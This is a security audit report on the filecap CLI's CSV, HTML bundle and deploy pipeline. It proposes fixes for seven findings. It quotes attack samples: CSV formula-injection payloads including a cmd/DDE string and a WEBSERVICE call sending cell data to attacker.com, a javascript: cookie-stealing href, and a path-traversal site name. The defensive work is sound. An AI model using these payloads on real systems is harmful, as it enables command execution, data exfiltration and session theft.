# filecap — Red/Blue Team Security Audit

**Audit date:** 2026-05-13
**Scope:** `@icjia/filecap@1.7.35` (currently published, currently deployed)
**Auditor:** Adversarial code-review pass against the CLI, bundle generator, and deploy pipeline
**Prior audit:** 2026-01 baseline at v1.3.0 — 17 findings, all Critical and Moderate fixed. This audit re-examines the same surface area plus everything added in v1.3.1 – v1.7.35.

## TL;DR

Of seven findings on this pass, **zero are Critical** and **zero are High that affect external attackers**. Three are Moderate and four are Low, with mitigations recommended for each. The biggest external-attacker risk is CSV-formula-injection through filenames — Moderate severity, easy fix. Everything else is insider / mis-configuration territory.

## Findings summary

| # | Severity | Finding | Status |
|---|---|---|---|
| 1 | **Moderate** | CSV-formula injection through filenames | Open; fix recommended |
| 2 | **Moderate** | `<a href>` emitted without URL-scheme validation | Open; fix recommended |
| 3 | **Moderate** | `sites.json` `name` field lacks slug-shape validation → path traversal in `~/filecap-audits/<name>/` | Open; fix recommended |
| 4 | Low | `secrets.json` file-mode is not enforced | Open; warn-on-load recommended |
| 5 | Low | Deploy bundle exposes internal server filesystem paths | Mitigated by Netlify Pro Site Password |
| 6 | Low | `webRollup.autoDeploy` config silently pushes to production | Documented; user-acknowledged |
| 7 | Info | Bundle artefact integrity not signed or checksummed | Defer; low utility unless distribution model changes |

---

## 1. CSV-formula injection through filenames — Moderate

**Threat model.** A malicious or curious actor uploads a file named `=cmd|'/c calc'!A1.pdf` (or `+SUM(1+1)`, `@DDE(...)`, `-2+3+cmd|'/c calc'!A1`, or a tab/CR-prefixed variant) to a Strapi `/uploads/` directory on one of the audited sites. filecap scans the directory, writes the filename into `audit-file-list-master.csv` (and per-site CSVs). A manager or remediation vendor opens the CSV in Excel, Numbers, or Google Sheets. Excel evaluates the leading-`=` cell as a formula, which can — in older Excel versions or with macros enabled — execute arbitrary commands, exfiltrate sheet contents to an attacker-controlled URL, or pivot via DDE.

**Where.** `src/report/format.js → csvCell(v)` quotes a cell only when it contains `",\n\r`. It does **not** prefix cells whose first character is `=`, `+`, `-`, `@`, tab (`0x09`), or carriage return (`0x0D`) — the OWASP CSV-injection canonical-leading-character set.

```js
// current
export function csvCell(v) {
  if (v === null || v === undefined) return "";
  const s = String(v);
  if (/[",\n\r]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}
```

**Likelihood.** Moderate. ICJIA Strapi instances only accept uploads from authenticated CMS users, so an external attacker would need a compromised CMS account or insider access first. But the audit CSVs are shared with external vendors during remediation — that's the exact path where formula-injected filenames would arrive on someone else's laptop.

**Impact.** Up to RCE on the spreadsheet-opener's workstation in worst case; data exfiltration via `=WEBSERVICE("attacker.com?"&A1)` in milder cases.

**Mitigation.** Prefix any cell whose first character is in `{= + - @ \t \r}` with a single quote (`'`). Excel and Sheets treat the prefix as a text-mode marker and strip it on display, so the cell shows the filename unchanged but doesn't evaluate. One-line addition to `csvCell`:

```js
const DANGEROUS_LEADING = /^[=+\-@\t\r]/;
export function csvCell(v) {
  if (v === null || v === undefined) return "";
  const s = String(v);
  const escaped = DANGEROUS_LEADING.test(s) ? `'${s}` : s;
  if (/[",\n\r]/.test(escaped)) {
    return `"${escaped.replace(/"/g, '""')}"`;
  }
  return escaped;
}
```

Add a corresponding test asserting that `csvCell("=cmd|'/c calc'!A1")` emits `'=cmd|'/c calc'!A1` (with the leading apostrophe). Estimated work: 15 min including test.

---

## 2. `<a href>` emitted without URL-scheme validation — Moderate

**Threat model.** A malicious value in `sites.json` (`publicUrlBase`, `siteUrl`) or an attacker-controlled `entry.absolutePath` (e.g. a git-type site whose absolutePath got tampered with during scan) flows into an `<a href="…">` in the HTML bundle. `htmlEscape` escapes `&<>"'` but does **not** validate that the URL scheme is `http(s):`. A value like `javascript:alert(document.cookie)` produces:

```html
<a href="javascript:alert(document.cookie)" target="_blank" rel="noopener noreferrer">javascript:alert(document.cookie)</a>
```

A manager clicking that link triggers arbitrary JS in the bundle's origin — even though the bundle is password-gated, the session cookie for `icjia-fleet-audit.netlify.app` is then exposed.

**Where.** `src/report/html.js` lines around 282-284 (publicUrl cell render), 376-377 (meta-grid Public URL row), and others where `<a href>` is built with an unvalidated value.

**Likelihood.** Low for external attackers (`sites.json` is local-only on the audit runner's workstation; `entry.absolutePath` comes from filecap's own scan code). Higher for insider mistakes (a sloppy `sites.json` edit, or a future scan target that returns weird absolutePath).

**Impact.** Defense-in-depth gap. Stealing a session cookie on a password-gated site limits the blast radius but is still real.

**Mitigation.** Add a helper `safeUrl(url)` that returns the URL only when it parses cleanly and the scheme is `http:` or `https:`; emit a plain text span when it doesn't:

```js
function safeUrl(url) {
  try {
    const u = new URL(url);
    if (u.protocol !== "http:" && u.protocol !== "https:") return null;
    return url;
  } catch { return null; }
}
```

Wrap every `<a href="${...}">` emit site through `safeUrl()`; emit `<span>${htmlEscape(value)}</span>` when null. Estimated work: 30 min including grep-sweep and tests.

---

## 3. `sites.json` `name` field lacks slug-shape validation → path traversal — Moderate

**Threat model.** `siteEntrySchema.name` in `src/commands/web-rollup.js` is `z.string().min(1)` — any non-empty string passes. The same field is then used in:

```js
const latestInv = path.join(auditsBase, siteKey, "latest", "inventory.ndjson");
```

If an attacker controls `sites.json` (insider, or compromised local environment), a `name: "../../etc"` value causes `latestInv` to resolve to `/Users/cschweda/etc/latest/inventory.ndjson` (outside `~/filecap-audits/`). The same field flows into the bundle's filename (`<slug>-<timestamp>Z.html`) and into `_redirects` rule generation, so traversal there too.

**Where.** `siteEntrySchema` definition in `src/commands/web-rollup.js` around line 18, used at line ~653 and downstream.

**Likelihood.** Low. `sites.json` lives in `~/.filecap/` on the audit runner's workstation; an attacker who can write there has already achieved local access. But sites.json IS shareable across team members (per the comment "sites.json is shareable, secrets.json is local-only") — a malicious shared sites.json from a poisoned source could compromise a colleague.

**Impact.** Read arbitrary files relative to `~/filecap-audits/`, write redirect rules with arbitrary paths into the Netlify bundle.

**Mitigation.** Tighten the schema:

```js
name: z.string().regex(/^[a-z0-9][a-z0-9-]*[a-z0-9]$/i, "name must be a kebab-case slug")
```

Same regex for `siteName` if used in any path-building context. Estimated work: 10 min including test.

---

## 4. `secrets.json` file-mode is not enforced — Low

**Threat model.** `~/.filecap/secrets.json` carries the bearer-token JWTs for sites whose `publicUrlBase` requires `Authorization: Bearer …` (currently `intranet-api-prod`). The file's documented expected mode is `0600`. `src/config/secrets.js` `loadSecrets()` does not check or enforce that mode — a misconfigured file at `0644` or `0664` (group/world readable) would load silently with no warning.

**Where.** `src/config/secrets.js → loadSecrets()`.

**Likelihood.** Moderate (user error). The `~/.filecap` directory is created by the user; if they `cp` a template file from somewhere else, file modes can come along.

**Impact.** Other users on the same workstation (rare for a developer laptop but real for shared servers) could read the bearer tokens; on macOS the Spotlight indexer may also slurp the contents into search history if mode is too permissive.

**Mitigation.** On load, `fs.stat` the file; if `(stat.mode & 0o077) !== 0`, emit a stderr warning ("filecap secrets file at <path> is world- or group-readable; recommended mode is 0600"). Don't refuse to load — the warning is enough for a single-user workstation. Estimated work: 20 min including test.

---

## 5. Deploy bundle exposes internal server filesystem paths — Low

**Threat model.** Per-site cards and detail pages show the scanned-path values from `sites.json` — e.g. `/home/forge/r3.icjia-api.cloud/strapi_v4/public/uploads`. This is operational metadata that hints at server architecture: the user account (`forge`), the directory layout convention (`strapi_v4/public/uploads`), the host naming pattern (`<site>.icjia-api.cloud`). Useful info for a reconnaissance-phase attacker.

**Where.** `src/report/html.js` access-panel and meta-grid; `src/web/index-page.js` tech-details disclosure.

**Likelihood.** Low — the bundle is behind Netlify Pro Site Password; only authenticated viewers see the paths.

**Impact.** Low. If the password gate is bypassed (lost-password incident, share-with-vendor with poor opsec), an external attacker gets a head-start on enumerating the actual servers. SSH still requires a valid key, so it's not direct compromise.

**Mitigation.** Already mitigated by the password gate. If a defense-in-depth fix is wanted: redact the user-portion of the path (`/home/forge/…` → `/home/<user>/…`) in the bundle. Defer unless the threat model changes.

---

## 6. `webRollup.autoDeploy` config silently pushes to production — Low

**Threat model.** `~/.filecap/config.json` `webRollup.autoDeploy: true` causes every `filecap web-rollup` invocation to push to production Netlify. A developer testing a local change with a `web-rollup` invocation (e.g. running tests that exercise the full pipeline) would unintentionally publish in-progress work. We hit this exact issue twice in this session.

**Where.** `src/commands/web-rollup.js → runNetlifyDeploy()` is called when `deploy` resolves true (either from `--deploy` CLI flag or `autoDeploy: true` in config).

**Likelihood.** Moderate (workflow trap). High during active development sessions.

**Impact.** Production-state mismatch — yesterday's deploy may show in-progress work the user didn't intend to share.

**Mitigation.** Two complementary options:

  1. Print a clear "PUSHING TO PRODUCTION (autoDeploy=true)" banner before invoking `netlify deploy --prod` so the operator sees what's happening and can Ctrl-C.
  2. Honour a `FILECAP_NO_DEPLOY=1` env var so tests / local builds can opt out without editing config.

Estimated work: 30 min for both.

---

## 7. Bundle artefact integrity not signed or checksummed — Informational

**Threat model.** The deployed bundle isn't signed (no `bundle.sig` or similar). A defender who downloads `audit-file-list-master.csv` from the bundle has no out-of-band way to verify they received the bytes filecap generated rather than bytes substituted by a man-in-the-middle.

**Likelihood.** Very low. TLS to Netlify + Netlify Pro password gate covers transit-layer attacks. The bundle artefacts have no signature, but TLS + DNS pinning of `icjia-fleet-audit.netlify.app` covers the threat model implicitly.

**Mitigation.** Defer. Signing CSVs is reasonable only if the distribution model shifts to "vendors download from email / random link" rather than "vendors fetch from a known TLS-gated URL." Not worth the operational cost (key management, key rotation, vendor education) right now.

---

## Changes since the 2026-01 baseline (security-relevant)

- **v1.7.32** stripped PDF/DOCX `author` + `lastModifiedBy` from `audit-fleet.ndjson`. The "Zero PII" banner is now strictly accurate; 983 individual names that had been in the AI-context NDJSON are no longer there.
- **v1.7.31** added a `_redirects` file with explicit per-site aliases. The aliases are static (built from the per-site canonical filename), not pattern-based — no open-redirect surface.
- **v1.7.34** added a clickable access-instructions modal. The modal content is hardcoded strings in `ACCESS_MODAL_COPY`, not derived from external data — no XSS surface.
- **v1.7.35** routed access requests directly to `christopher.schweda@illinois.gov`. The email address is now embedded in the public bundle; mitigated by the Netlify password gate.
- **FC-2026-006**: `sitesFile` argument is validated to end in `.json` before being passed to `fs.readFile`, blocking attempts to read arbitrary file types via the `--sites-file` CLI flag.
- **FC-2026-007**: `sites.json` schema is `.strict()`-validated by zod — unknown fields are rejected, not silently ignored.

## Recommended fix order

1. **CSV-formula injection** (Finding #1) — 15 min, easy, externally-reachable.
2. **`<a href>` scheme validation** (Finding #2) — 30 min, defense-in-depth.
3. **`sites.json` name regex** (Finding #3) — 10 min, narrows the insider-threat surface.
4. **`secrets.json` mode warning** (Finding #4) — 20 min, prevents a common config slip.
5. **`autoDeploy` UX banner + env-var opt-out** (Finding #6) — 30 min, workflow safety.

Findings 5 and 7 are intentionally deferred — the threat model already covers them via the Netlify password gate and TLS respectively.

## Verification approach

For each fix, the verification is:
- a unit test asserting the new defense behaves correctly,
- a manual probe demonstrating the bug-before-fix (an attack payload that succeeded), and
- the same probe demonstrating the bug-after-fix (the payload now sanitized).

Each fix is independent and can ship in its own patch release (`1.7.36`, `1.7.37`, etc.) — no coupling between findings.
